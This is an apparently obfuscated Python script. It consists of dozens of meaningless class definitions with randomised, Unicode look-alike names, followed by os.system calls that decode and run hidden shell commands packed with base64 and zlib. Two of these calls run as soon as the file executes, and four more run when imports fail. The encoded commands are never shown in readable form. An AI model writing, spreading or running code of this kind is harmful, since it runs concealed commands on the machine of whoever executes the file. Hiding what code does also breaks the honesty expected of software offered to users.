class LADTOWbTl4VgSOO84iDA3PNM_NZaoAuZ(𝗶𝘯𝘁):...

class wutUc2LscrnzDRwirEMJ1Dw0o_wRl922(𝙨𝘁𝙧):...

class V_3d2WzfIWvcb2pLEnC1rmRb1_nU7d7T(𝘀𝙩𝙧):...

class WHjvDj42Ubv1fZKXNPgzCBtk3ABnTskN(𝗶𝙣𝘵):...

class YV16Sj_lBLuEkhfD0WkLJaAD2ZwhtAaS(𝗶𝘯𝘵):...

class lk5vdycsLRNQ2CU2eORb0AzXwLWm_rzk(𝘪𝗻𝘵):...

class dcat9oj1Yb_RtP7GIM2YlSGOelh851my(𝘪𝗻𝘁):...

class yIhO05YRfze7l51B9MCTG5aMXM2W1sUf(𝘪𝗻𝙩):...

class wfV_aWiGgrCFfJPUn9dIfAOUUmpRjVI_(𝙛𝗹𝗼𝗮𝘵):...

class urxc1jMXe63BUSaSGaVagA9glpeWSdOM(𝗳𝙡𝙤𝙖𝙩):...

class BrXJG6rowtDzCjAF2ymXpmvUcNrFILdk(𝗶𝙣𝙩):...

class SxH8WMZQcr7D5mfqeGetX9CbGQWM2iUC(𝙇𝘼𝘋𝗧𝘖𝙒𝗯𝘛𝙡4𝙑𝘨𝗦𝙊𝗢84𝘪𝘿𝗔3𝗣𝗡𝘔_𝙉𝗭𝘢𝙤𝘼𝘂𝘡):...

class frP6SLvTEhf5jkodF9iBbaExsfp9NV8i(𝘸𝘂𝘵𝙐𝘤2𝘓𝘴𝘤𝘳𝙣𝘻𝗗𝘙𝘄𝗶𝙧𝘌𝘔𝘑1𝗗𝘄0𝗼_𝘸𝙍𝘭922):...

class s6J1tdlrdN74DS25yh7SBAzsfHN9E_n6(𝙑_3𝘥2𝘞𝘻𝙛𝙄𝙒𝘃𝙘𝗯2𝙥𝗟𝗘𝙣𝘾1𝗿𝗺𝙍𝘣1_𝘯𝙐7𝙙7𝙏):...

class ORztIOS12NB6MU7xoXFbbLWmVni_aFAn(𝙒𝙃𝘫𝙫𝘋𝙟42𝘜𝙗𝘃1𝘧𝘡𝗞𝘟𝙉𝗣𝘨𝙯𝘾𝗕𝙩𝗸3𝘼𝘽𝗻𝙏𝘀𝘬𝗡):...

class Wk80NqtHhMhGAvlhHLfuKfRXjJsQKpOS(𝙔𝘝16𝘚𝗷_𝗹𝗕𝗟𝙪𝘌𝘬𝙝𝙛𝗗0𝘞𝙠𝗟𝘑𝙖𝘈𝗗2𝗭𝙬𝗵𝙩𝘈𝙖𝘚):...

class y52gAtZHVHlHjBppUs4KvrPmVj63MBBL(𝙡𝗸5𝘷𝘥𝘆𝗰𝙨𝙇𝙍𝘕𝘘2𝘾𝙐2𝘦𝙊𝘙𝘣0𝘈𝙯𝙓𝙬𝗟𝘞𝗺_𝗿𝘇𝗸):...

class WUf_JAaTba2QOStDpY_mLJyDJBocR3Ug(𝙙𝙘𝘢𝘁9𝙤𝙟1𝘠𝗯_𝙍𝙩𝗣7𝙂𝘐𝙈2𝘠𝘭𝙎𝗚𝗢𝘦𝘭𝗵851𝙢𝘆):...

class PJ_hfCzOV3lwB2CQkB9JduGDWt150avO(𝙮𝗜𝗵𝙊05𝘠𝙍𝙛𝘻𝙚7𝗹51𝘉9𝘔𝘊𝙏𝗚5𝗮𝘔𝗫𝗠2𝘞1𝘴𝗨𝙛):...

class yO_kuh9dXfy9gpqU4JHbPKalozzTgn3j(𝘄𝘧𝙑_𝗮𝗪𝗶𝘎𝙜𝘳𝘾𝙁𝙛𝗝𝘗𝘜𝘯9𝗱𝗜𝗳𝗔𝙊𝘜𝗨𝙢𝗽𝗥𝙟𝘝𝙄_):...

class K3zO5JFs82hQZ6djjq3pz20pSfbdxl2_(𝙪𝘳𝘹𝗰1𝗷𝙈𝘟𝙚63𝗕𝙐𝙎𝘢𝗦𝘎𝙖𝗩𝙖𝘨𝗔9𝗴𝘭𝙥𝘦𝗪𝙎𝗱𝘖𝙈):...

class aSMFY5uSht4g9phm65vnFTUrkgVcbXl1(𝘽𝙧𝘟𝗝𝙂6𝗿𝙤𝙬𝙩𝘋𝘻𝗖𝘫𝘼𝘍2𝘺𝙢𝙓𝘱𝗺𝘃𝙐𝗰𝙉𝗿𝙁𝗜𝗟𝙙𝗸):...

class jEieN89iPcGVMV1LmRoWJOEvLwhQ_JKj(𝗦𝘅𝘏8𝘞𝗠𝘡𝙌𝘤𝗿7𝘿5𝗺𝘧𝗾𝗲𝗚𝗲𝘁𝗫9𝗖𝗯𝙂𝘘𝘞𝘔2𝗶𝙐𝗖):...

class OJ1Wner8fZFwZTBmaRlP2bdmzGwjuOTo(𝙛𝙧𝙋6𝗦𝘓𝘷𝘛𝘌𝗵𝙛5𝘫𝘬𝗼𝘥𝗙9𝗶𝗕𝗯𝙖𝘌𝘅𝙨𝘧𝘱9𝘕𝘝8𝘪):...

class nYtFDRbrAkqK5Tu7QZLjCcIq55UO1NAJ(𝘴6𝙅1𝘵𝙙𝙡𝗿𝙙𝗡74𝗗𝘚25𝘆𝙝7𝙎𝘉𝘼𝘇𝘀𝘧𝙃𝗡9𝘌_𝗻6):...

class _abvMjA_VBG_bRc2TOe9nMxPa7u2lAk5(𝗢𝗥𝘇𝘁𝙄𝙊𝗦12𝙉𝘽6𝗠𝗨7𝘅𝙤𝘟𝙁𝙗𝙗𝙇𝘞𝘮𝙑𝙣𝙞_𝗮𝘍𝘈𝗻):...

class y7jrejihcP8iw43LEeYc8gDqiOcwmUmj(𝙒𝘬80𝗡𝙦𝙩𝘏𝗵𝙈𝗵𝙂𝘈𝘃𝙡𝗵𝙃𝘓𝙛𝘶𝗞𝗳𝘙𝘟𝗷𝙅𝙨𝘘𝗞𝘱𝙊𝘚):...

class dLLo_T8LeqoD7iHW8lmKoBjGqLUC3Iz4(𝘺52𝘨𝘼𝘁𝙕𝙃𝘝𝘏𝘭𝘏𝗷𝘽𝗽𝗽𝗨𝘴4𝗞𝘃𝙧𝘗𝘮𝘝𝘫63𝗠𝗕𝘽𝗟):...

class _7jD1DlfKaRkeGLnzMVk1fUZPAnIkmw2(𝗪𝙐𝘧_𝘑𝗔𝙖𝘛𝗯𝘢2𝘘𝗢𝗦𝙩𝘿𝙥𝘠_𝗺𝙇𝙅𝘺𝗗𝘑𝘉𝙤𝘤𝙍3𝙐𝘨):...

class uB9Bmxf3CrKWAd9ncOR8anLcw6tM40CV(𝙋𝙅_𝗵𝘧𝘾𝙯𝙊𝙑3𝘭𝘄𝘽2𝘊𝘘𝘬𝗕9𝙅𝗱𝙪𝘎𝗗𝗪𝘵150𝘢𝙫𝗢):...

class QvrFvg98x5Gk0MFpIW2Agg4mET0nHue9(𝙮𝘖_𝗸𝘶𝗵9𝘥𝙓𝗳𝘆9𝘨𝗽𝙦𝙐4𝙅𝙃𝘣𝘗𝗞𝘢𝗹𝘰𝘇𝙯𝘛𝙜𝙣3𝗷):...

class fC8iNASguNlvGuZXUU9q69Fg_rCX9usk(𝗞3𝘻𝗢5𝗝𝗙𝘀82𝗵𝘘𝗭6𝙙𝘫𝙟𝘲3𝘱𝘇20𝙥𝙎𝙛𝙗𝙙𝘅𝙡2_):...

class Zc4O1TKvACoXBLVnmu3WuFmChtf5l1_l(𝘢𝘚𝘔𝙁𝙔5𝙪𝘚𝙝𝘁4𝗴9𝗽𝙝𝗺65𝘃𝘯𝘍𝙏𝙐𝗿𝙠𝘨𝘝𝗰𝘣𝗫𝘭1):...

class Nd_Gzq9N8eJRrCTMnBIqR80jLJB4z3SJ(𝘫𝗘𝗶𝘦𝙉89𝘪𝘗𝙘𝘎𝗩𝙈𝘝1𝘓𝙢𝘙𝙤𝗪𝙅𝙊𝘌𝘃𝘓𝘸𝘩𝙌_𝗝𝘒𝗷):...

class XYg9AkKwMUzWO9YEchb_gS6D53CHaC5U(𝘖𝗝1𝙒𝘯𝗲𝘳8𝗳𝙕𝗙𝙬𝘡𝘛𝘉𝘮𝗮𝙍𝙡𝘗2𝙗𝘥𝗺𝙯𝘎𝙬𝘫𝙪𝗢𝗧𝗼):...

class wbRKz5cCW81kIAWAH1GrAO5KDC6_p6Rh(𝗻𝘠𝙩𝙁𝗗𝘙𝘣𝙧𝘼𝗸𝗾𝘒5𝗧𝘂7𝙌𝗭𝗟𝙟𝗖𝘤𝙄𝗾55𝘜𝗢1𝗡𝘈𝙅):...

class caBeLNjfViauYPP9ZpoBs7mBY75giPt5(_𝗮𝗯𝙫𝗠𝘫𝗔_𝗩𝘉𝘎_𝘣𝗥𝗰2𝙏𝗢𝗲9𝗻𝙈𝙭𝙋𝘢7𝘂2𝗹𝗔𝘬5):...

class KZBu2H4Il0b8VDARLlE24W8EZMSYgMra(𝘆7𝘫𝙧𝙚𝗷𝙞𝙝𝗰𝘗8𝙞𝘸43𝗟𝗘𝗲𝘠𝘤8𝗴𝘿𝙦𝗶𝙊𝗰𝘸𝗺𝙐𝗺𝘫):...

class zO4phI7lIwP9_GJv2PX6vrCgDFV1fpeN(𝙙𝙇𝗟𝘰_𝙏8𝗟𝗲𝗾𝗼𝘿7𝗶𝗛𝗪8𝗹𝘮𝗞𝙤𝘉𝗷𝙂𝗾𝙇𝗨𝘾3𝗜𝘇4):...

class JMwo84dP9KKZd_7dkxyDmlKdMdZaVQuT(_7𝙟𝘋1𝗗𝗹𝙛𝘒𝙖𝗥𝘬𝗲𝙂𝙇𝘯𝘇𝗠𝗩𝘬1𝙛𝙐𝙕𝙋𝘈𝘯𝗜𝘬𝙢𝘄2):...

class hkyPFcTpaH71fwpdLNCQIseNzquevWOM(𝙪𝗕9𝗕𝙢𝘹𝙛3𝘊𝘳𝗞𝙒𝘈𝗱9𝘯𝗰𝗢𝙍8𝗮𝗻𝗟𝗰𝘄6𝘵𝗠40𝘊𝗩):...

class mKhKoZllT8KmKXHoy2GyLb2KBk4LYzgX(𝘘𝘃𝙧𝘍𝙫𝙜98𝘅5𝘎𝗸0𝗠𝙁𝗽𝗜𝗪2𝘼𝗴𝙜4𝘮𝗘𝘛0𝘯𝙃𝘂𝗲9):...

class qRVyfugmqoEfkTvwM6x3iixbpvi1El8N(𝙛𝘾8𝙞𝘕𝘼𝙎𝘨𝘶𝘕𝙡𝘷𝘎𝘶𝙕𝗫𝙐𝘜9𝘲69𝘍𝙜_𝘳𝘾𝙓9𝘂𝘴𝘬):...

class kCuaEj5tNX13VFKE52YsHhhuG9Qontz6(𝗭𝙘4𝘖1𝘛𝗞𝘷𝘈𝘊𝘰𝘟𝘉𝗟𝘝𝘯𝘮𝘶3𝗪𝙪𝙁𝗺𝗖𝙝𝙩𝗳5𝙡1_𝘭):...

class pZghf2qG438TzWwhYEGhgDFkDSO97kPB(𝙉𝘥_𝗚𝘻𝙦9𝗡8𝘦𝗝𝙍𝘳𝗖𝘛𝗠𝙣𝘽𝗜𝙦𝗥80𝗷𝗟𝙅𝘽4𝙯3𝗦𝗝):...

class kBxkNtRNSSeVPrbD_z_imhuBNW0yhyJ6(𝗫𝙔𝗴9𝗔𝘬𝘒𝙬𝗠𝙐𝘻𝗪𝘖9𝗬𝗘𝘤𝗵𝙗_𝗴𝘚6𝘋53𝘊𝗛𝘢𝘾5𝘜):...

class ecYWmEqwhgqtF78VzT6_xPZIXTuapVRV(𝙬𝗯𝗥𝘒𝘻5𝗰𝘊𝗪81𝗸𝗜𝘼𝘞𝘼𝘏1𝗚𝗿𝗔𝙊5𝙆𝘿𝗖6_𝗽6𝙍𝗵):...

class tLv5w81mWY7RZkGeazhjcKleDv_XGDIo(𝙘𝙖𝘽𝙚𝗟𝗡𝘫𝗳𝘝𝙞𝘢𝘂𝗬𝘗𝗣9𝘡𝗽𝗼𝘽𝘴7𝘮𝗕𝘠75𝗴𝗶𝗣𝘵5):...

class tvdrq2vpCD6c_04C28VgEZmdfHC7CtfQ(𝙆𝘡𝘽𝘶2𝘏4𝙄𝘭0𝙗8𝘝𝗗𝘼𝗥𝙇𝙡𝗘24𝗪8𝘌𝘡𝙈𝘚𝙔𝙜𝘔𝘳𝘢):...

class JWbm5pfs3WCiIUFxfT4XWngixAEhnLLU(𝘇𝗢4𝗽𝘩𝘐7𝘭𝙄𝙬𝗣9_𝙂𝙅𝘃2𝗣𝗫6𝘷𝗿𝘊𝘨𝗗𝗙𝘝1𝘧𝙥𝙚𝘕):...

class iUtthtowm7Bf3hQ7BN96p3OopgMACFt8(𝘑𝙈𝘄𝗼84𝙙𝙋9𝗞𝗞𝘡𝗱_7𝘥𝘬𝙭𝘺𝘋𝗺𝙡𝘒𝙙𝗠𝙙𝗭𝘢𝗩𝙌𝘂𝘛):...

class DxorDEzb7fkXbrkp3iHAFH4A6WkFAwgT(𝘩𝙠𝘺𝘗𝙁𝗰𝗧𝙥𝙖𝙃71𝘧𝙬𝙥𝙙𝘓𝙉𝗖𝗤𝙄𝘴𝙚𝙉𝙯𝗾𝘂𝙚𝘷𝗪𝘖𝘔):...

class DhNjIHEkBvwz7d4xcp2Ghqo3k0WxMrkU(𝗺𝗞𝗵𝘒𝘰𝙕𝗹𝗹𝙏8𝗞𝙢𝘒𝘟𝘏𝗼𝙮2𝘎𝘺𝘓𝗯2𝙆𝗕𝙠4𝘓𝙔𝘻𝗴𝙓):...

class kPDfql5900LPSwzRiXxllB48Pq4M5U9d(𝘲𝗥𝙑𝙮𝘧𝘶𝘨𝙢𝘲𝗼𝗘𝘧𝘬𝗧𝘃𝘄𝘔6𝙭3𝘪𝙞𝘹𝘣𝗽𝘷𝗶1𝗘𝗹8𝙉):...

class IN_9A2YjdMdKvapWkEmV09cD0DBLIlGH(𝗸𝘊𝘂𝘢𝙀𝙟5𝙩𝘕𝙓13𝙑𝗙𝘒𝘌52𝗬𝘴𝘏𝘩𝗵𝙪𝙂9𝗤𝘰𝙣𝘁𝙯6):...

class KPeYxtbHB4KapaQLMQhv2ykA4motVMXs(𝗽𝘡𝘨𝘩𝙛2𝘲𝙂438𝘛𝘇𝙒𝘄𝘩𝘠𝗘𝗚𝘩𝗴𝗗𝘍𝙠𝗗𝙎𝘖97𝙠𝘗𝗕):...

class ZyKEgLP6UUYBkhMWkZgOTmJdaMQQMpEc(𝘬𝘽𝘅𝙠𝗡𝘵𝘙𝘕𝘚𝙎𝘦𝘝𝙋𝘳𝗯𝘋_𝘻_𝙞𝘮𝙝𝘂𝘉𝙉𝙒0𝘆𝙝𝙮𝗝6):...

class qI8SqhFrQ64K2fV7tTj_W44bJxquj0IQ(𝘦𝘤𝗬𝙒𝘮𝙀𝗾𝘸𝘩𝗴𝙦𝙩𝙁78𝗩𝘇𝙏6_𝘅𝘗𝘡𝘐𝗫𝘛𝘶𝘢𝗽𝘝𝙍𝘝):...

class hW_HHAgTY4l3hco1Y8AVdlC58gvAIkyo(𝙩𝘓𝘃5𝘄81𝘮𝙒𝙔7𝗥𝘡𝙠𝙂𝙚𝙖𝘇𝙝𝗷𝘤𝗞𝙡𝙚𝗗𝘃_𝗫𝗚𝗗𝘐𝘰):...

class A1anGm34AJbZc6U7bB4qNt0wLiwYBXQe(𝘁𝙫𝘥𝙧𝗾2𝙫𝗽𝗖𝗗6𝘤_04𝘊28𝘝𝗴𝘌𝙕𝘮𝗱𝘧𝙃𝗖7𝗖𝘁𝘧𝙌):...

class q_upI8JLADMD030mvsSBc8BYfo4KPfDz(𝙅𝗪𝗯𝗺5𝙥𝘧𝘀3𝘞𝘾𝘪𝗜𝗨𝙁𝘅𝙛𝙏4𝘟𝙒𝗻𝙜𝗶𝘅𝘼𝙀𝙝𝘯𝘓𝙇𝗨):...

class NNofklwmLO2aKR_BkqdpjbENhd509hwC(𝘿𝙭𝘰𝘳𝘋𝘌𝘻𝙗7𝘧𝘬𝙓𝙗𝘳𝙠𝘱3𝘪𝙃𝗔𝘍𝘏4𝗔6𝗪𝗸𝘍𝘈𝘸𝙜𝘛):...

class CQF6YP3vvenJkAO45uTSerIoxkO2EYmk(𝗗𝙝𝘕𝘫𝗜𝙃𝗘𝗸𝘽𝘷𝙬𝙯7𝙙4𝙭𝘤𝗽2𝘎𝙝𝗾𝗼3𝙠0𝙒𝙭𝙈𝗿𝗸𝗨):...

class JmJ_n5G7r2tqKdzkI_vzSUvdFR4Cec__(𝘬𝙋𝘋𝘧𝙦𝙡5900𝙇𝗣𝘚𝘸𝘻𝗥𝗶𝘟𝙭𝙡𝗹𝗕48𝗣𝗾4𝙈5𝙐9𝗱):...

class NZoLCvDLj83MOekXr_h3xyKwkm4_q4Hq(𝘐𝗡_9𝘈2𝘠𝗷𝙙𝘔𝙙𝗞𝘷𝘢𝘱𝘞𝙠𝗘𝙢𝘝09𝙘𝘿0𝘿𝘽𝗟𝙄𝙡𝙂𝘏):...

class Nw25Xb2jII4Wj3_dqmjN8tPsWLfRLa5O(𝙕𝙮𝘒𝗘𝗴𝘓𝗣6𝙐𝗨𝗬𝗕𝘬𝗵𝗠𝗪𝘬𝗭𝙜𝙊𝙏𝙢𝙅𝗱𝘢𝘔𝙌𝙌𝘔𝘱𝙀𝘤):...

class Xtj93GNMQUMxieg2CKubvisH6ZZwe86s(𝙦𝘐8𝙎𝘲𝗵𝙁𝗿𝙌64𝙆2𝗳𝗩7𝙩𝙏𝙟_𝘞44𝙗𝙅𝙭𝘲𝙪𝙟0𝙄𝙌):...

class Wzy2dv9ZNfODnu5c4k2mWevz0qaupxpg(𝗵𝙒_𝗛𝗛𝘼𝗴𝘛𝗬4𝗹3𝙝𝘤𝗼1𝗬8𝘈𝘝𝘥𝙡𝘾58𝗴𝘃𝘈𝗜𝙠𝘺𝗼):...

class hfvAe1lDNF_pCffJmwR6U2qsYAQyOzPr(𝗔1𝗮𝙣𝘎𝘮34𝘈𝘑𝘣𝙕𝗰6𝙐7𝘣𝗕4𝘲𝗡𝙩0𝙬𝙇𝙞𝘄𝗬𝘉𝙓𝘘𝙚):...

class Yn6lZfCIQoqiqRQDRgJau0u6SvEZd1Qf(𝙦_𝘂𝙥𝙄8𝗝𝗟𝘼𝘋𝘔𝘋030𝘮𝘷𝘴𝘚𝗕𝘤8𝘉𝙔𝘧𝙤4𝗞𝘗𝙛𝗗𝙯):...

class wCkxMB1LJLA30cToyzp0jAu4fK3i3udT(𝙉𝙉𝙤𝗳𝘬𝗹𝘄𝗺𝗟𝗢2𝘢𝙆𝙍_𝘽𝗸𝗾𝙙𝙥𝘫𝙗𝘌𝗡𝙝𝗱509𝘩𝘄𝗖):...

class T4uYsxbalcfXdxGIeSijWTS4on4Y0PnC(𝘾𝘘𝗙6𝙔𝗣3𝙫𝘃𝘦𝗻𝗝𝙠𝗔𝙊45𝘶𝙏𝗦𝗲𝙧𝘐𝘰𝙭𝗸𝗢2𝘌𝘠𝗺𝗸):...

class tbIfKE4rVPU0drPtBOxI1Pb4YlMo2CMj(𝙅𝗺𝗝_𝙣5𝗚7𝙧2𝘵𝗾𝘒𝙙𝘇𝙠𝘐_𝘷𝘇𝙎𝗨𝘷𝙙𝙁𝙍4𝗖𝗲𝘤__):...

class RnE1CtVAvwewSiMIvc14Af0MwzN0pJjg(𝗡𝙕𝗼𝗟𝗖𝘃𝘿𝘓𝙟83𝙈𝙊𝙚𝙠𝘟𝗿_𝗵3𝙭𝙮𝘒𝙬𝗸𝗺4_𝙦4𝘏𝘲):...

class _Cv41gfkbntTyHcxZ4dkutSo10P7lKSa(𝗡𝘸25𝗫𝘣2𝙟𝗜𝙄4𝘞𝗷3_𝙙𝗾𝘮𝘫𝙉8𝘁𝙋𝘀𝘞𝙇𝗳𝗥𝗟𝘢5𝘖):...

class pBnFoYlHHDfjdVdfgeaUqbCCinnn8muI(𝙒𝘇𝘆2𝙙𝘃9𝗭𝗡𝗳𝙊𝘿𝙣𝘂5𝘤4𝗸2𝘮𝘞𝗲𝘷𝙯0𝗾𝙖𝘂𝗽𝘹𝙥𝙜):...

class fwOKdgLfSULkcGMPGBmRoZLHdeZ3x1sY(𝗬𝙣6𝘭𝙕𝗳𝘊𝗜𝘘𝘰𝗾𝘪𝙦𝗥𝗤𝘋𝘙𝘨𝗝𝘢𝘂0𝘂6𝘚𝘷𝙀𝙕𝘥1𝘘𝙛):...

class RQAVG3Q4IetXbeOzbEghGMvv7wIAjwdB(𝘄𝘾𝗸𝘅𝙈𝗕1𝗟𝘑𝘓𝘼30𝙘𝗧𝙤𝘆𝘻𝗽0𝙟𝗔𝙪4𝙛𝗞3𝘪3𝙪𝘥𝙏):...

class JNQ5TGUvYCeUTq30hueCukMN2UKX7CSu(𝘛4𝙪𝗬𝙨𝙭𝗯𝗮𝘭𝗰𝘧𝙓𝙙𝘅𝙂𝙄𝙚𝙎𝙞𝙟𝗪𝘛𝘚4𝗼𝗻4𝘠0𝙋𝘯𝘾):...

class fsOMuCVhYxXPTMiyaVH4EqIGtd6SOqMD(𝘵𝗯𝙄𝙛𝘒𝘌4𝗿𝘝𝗣𝘜0𝙙𝙧𝗣𝘁𝘉𝙊𝘹𝗜1𝘗𝘣4𝘠𝗹𝘔𝗼2𝘾𝘔𝙟):...

class kysupJ7UGTnL00fP4dk1u_6QGQiF0j_V(𝙍𝘯𝙀1𝗖𝙩𝘝𝗔𝘷𝘸𝙚𝘸𝘚𝙞𝘔𝗜𝘃𝙘14𝘼𝘧0𝘔𝘸𝙯𝗡0𝙥𝗝𝘫𝘨):...

class FLpSeKmB72fHL8BRewJa04fJ3DQpwtp_(_𝘊𝘷41𝘨𝙛𝘬𝙗𝙣𝘵𝘛𝘆𝘏𝗰𝘅𝗭4𝘥𝙠𝘶𝙩𝘚𝘰10𝗣7𝙡𝙆𝙎𝘢):...

class f3nVGQKFiyRvfR3Dr2gRffNhb_n1aQmm(𝘙𝙌𝘼𝘝𝘎3𝙌4𝙄𝗲𝙩𝘟𝙗𝙚𝙊𝘻𝘣𝗘𝙜𝗵𝙂𝗠𝙫𝘷7𝙬𝘐𝘈𝘫𝘄𝗱𝗕):...

class xl6LpGNvVtD332muxOg_m0RVtpT1a484(𝙛𝘀𝙊𝗠𝙪𝗖𝗩𝗵𝗬𝙭𝘟𝘗𝙏𝙈𝙞𝘺𝘢𝙑𝙃4𝘌𝗾𝘐𝗚𝙩𝙙6𝘚𝘖𝘲𝘔𝗗):...

class j65j1gCb8Z82z7sJjmxobWM7c7W1SHJc(𝙁𝗟𝘱𝘚𝗲𝗞𝗺𝘽72𝘧𝗛𝘓8𝘉𝗥𝙚𝙬𝙅𝗮04𝘧𝙅3𝘿𝙌𝙥𝘄𝘵𝗽_):...
𝙡𝙈𝙄𝗜𝗠𝙡𝘔𝗡𝗜𝘐𝗡𝘔𝙡𝗹𝘐𝙈𝙡𝗠𝗹𝙄𝗠𝘐𝙈𝗜𝙉𝙈𝗜𝗹𝙡𝙡𝘕𝘭 = ['base64', 'zlib']
import os
𝗼𝘴.system(__𝗶𝙢𝙥𝙤𝘳𝘵__(𝙡𝘔𝗜𝘐𝙈𝘭𝘔𝘕𝙄𝗜𝘕𝗠𝗹𝙡𝙄𝘔𝙡𝗠𝙡𝘐𝗠𝙄𝙈𝗜𝙉𝙈𝙄𝙡𝗹𝙡𝙉𝘭[𝙧𝙤𝙪𝘯𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝗿𝙩__(𝙡𝙈𝙄𝘐𝘔𝙡𝘔𝘕𝘐𝗜𝙉𝙈𝗹𝘭𝘐𝗠𝗹𝘔𝙡𝗜𝙈𝗜𝘔𝗜𝗡𝘔𝗜𝙡𝘭𝙡𝙉𝘭[𝘳𝗼𝘂𝘯𝙙(𝙖𝘣𝘴(0.8595903427873327 + 0.5109837987517372j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6HO6\x0e\xcaH\xce\x0b*H\xcaMNO\x89p\xb4\x05\x00\xe3i\x0cl')).decode())
𝘰𝘀.system(__𝙞𝘮𝙥𝘰𝙧𝙩__(𝘭𝘔𝙄𝙄𝗠𝗹𝗠𝗡𝗜𝙄𝙉𝙈𝘭𝘭𝗜𝘔𝗹𝗠𝘭𝙄𝙈𝘐𝙈𝘐𝙉𝙈𝙄𝙡𝘭𝙡𝙉𝗹[𝗿𝗼𝘶𝙣𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝙧𝙩__(𝗹𝗠𝙄𝗜𝗠𝘭𝗠𝗡𝘐𝗜𝗡𝙈𝙡𝙡𝗜𝘔𝗹𝗠𝘭𝘐𝗠𝘐𝙈𝗜𝙉𝗠𝗜𝙡𝙡𝘭𝙉𝗹[𝙧𝗼𝘂𝘯𝙙(𝗮𝘣𝙨(0.08902536277451878 + 0.9960293593980377j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
try:
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
except 𝙈𝙤𝘥𝘶𝘭𝗲𝙉𝘰𝙩𝙁𝘰𝘂𝘯𝘥𝘌𝗿𝙧𝗼𝙧:
    𝗼𝘀.system(__𝙞𝗺𝙥𝘰𝘳𝘵__(𝘭𝗠𝘐𝗜𝗠𝘭𝗠𝘕𝙄𝗜𝙉𝗠𝘭𝗹𝗜𝗠𝘭𝙈𝙡𝙄𝘔𝗜𝙈𝙄𝗡𝘔𝙄𝘭𝗹𝙡𝙉𝘭[𝙧𝘰𝙪𝙣𝙙(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝘰𝗿𝙩__(𝙡𝙈𝗜𝙄𝙈𝙡𝗠𝙉𝙄𝗜𝙉𝘔𝗹𝗹𝙄𝘔𝘭𝙈𝘭𝘐𝘔𝙄𝗠𝙄𝙉𝘔𝙄𝗹𝘭𝘭𝙉𝙡[𝗿𝘰𝘂𝗻𝗱(𝗮𝗯𝙨(0.6947757238066126 + 0.7192264550258128j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/O\x8f4\xb2,N2\xf6\xcaH\nwM\x0f\xc8t*M\t/\xb7\x05\x00\xea_\x0c\x98')).decode())
    𝘰𝘀.system(__𝙞𝘮𝘱𝙤𝘳𝘁__(𝙡𝘔𝗜𝗜𝗠𝙡𝙈𝘕𝙄𝙄𝘕𝘔𝗹𝙡𝘐𝗠𝘭𝙈𝘭𝙄𝗠𝙄𝙈𝘐𝙉𝙈𝘐𝗹𝙡𝙡𝙉𝗹[𝗿𝘰𝘂𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝘁__(𝙡𝙈𝘐𝘐𝗠𝘭𝘔𝙉𝘐𝗜𝗡𝙈𝙡𝗹𝙄𝙈𝙡𝗠𝘭𝙄𝙈𝘐𝙈𝘐𝙉𝘔𝗜𝙡𝗹𝘭𝗡𝘭[𝙧𝙤𝘂𝙣𝗱(𝙖𝘣𝘴(0.4910039050761481 + 0.8711573710874362j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO\xca\x0b+I\xf6\xc8N\x0fH\xb7\xb5\x05\x00\x94\xd8\n\x1e')).decode())
    𝗼𝙨.system(__𝘪𝗺𝗽𝗼𝘳𝘵__(𝘭𝗠𝙄𝘐𝗠𝘭𝘔𝗡𝙄𝘐𝗡𝙈𝗹𝘭𝗜𝗠𝙡𝘔𝙡𝘐𝘔𝙄𝘔𝙄𝘕𝙈𝙄𝗹𝙡𝘭𝘕𝙡[𝗿𝙤𝙪𝗻𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝙩__(𝙡𝙈𝙄𝘐𝙈𝘭𝙈𝙉𝘐𝗜𝙉𝘔𝘭𝙡𝙄𝙈𝙡𝗠𝙡𝙄𝙈𝘐𝗠𝘐𝘕𝗠𝗜𝗹𝘭𝗹𝗡𝙡[𝙧𝙤𝙪𝙣𝙙(𝗮𝗯𝘴(0.9639237191578253 + 0.26617863108248563j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OOvw3Ht\xaf(\x88\xcct\xd4\xf6t75Lr\xb4\xb5\x05\x00\xe7\xc5\x0b\xc7')).decode())
    𝘰𝙨.system(__𝘪𝗺𝗽𝗼𝙧𝙩__(𝙡𝘔𝘐𝗜𝗠𝗹𝗠𝘕𝙄𝗜𝗡𝗠𝗹𝗹𝙄𝙈𝙡𝙈𝘭𝘐𝗠𝙄𝗠𝗜𝗡𝙈𝗜𝙡𝗹𝗹𝙉𝗹[𝘳𝙤𝘶𝙣𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__(𝙡𝘔𝘐𝙄𝘔𝘭𝙈𝘕𝗜𝙄𝙉𝗠𝗹𝙡𝙄𝘔𝘭𝗠𝘭𝘐𝗠𝙄𝘔𝗜𝗡𝗠𝙄𝘭𝘭𝘭𝘕𝙡[𝙧𝙤𝘂𝘯𝙙(𝘢𝗯𝘴(0.693013692346637 + 0.7209244219889355j))]).decompress(b'x\xdaKv\xcf)\xf7t\xcf)M6\x0e\xcaHr/OO1\n\xcbL6\xb2\xccJ4\n3\xf0t1IO\xca\x0b+\x06\x00\xe7<\x0c=')).decode())
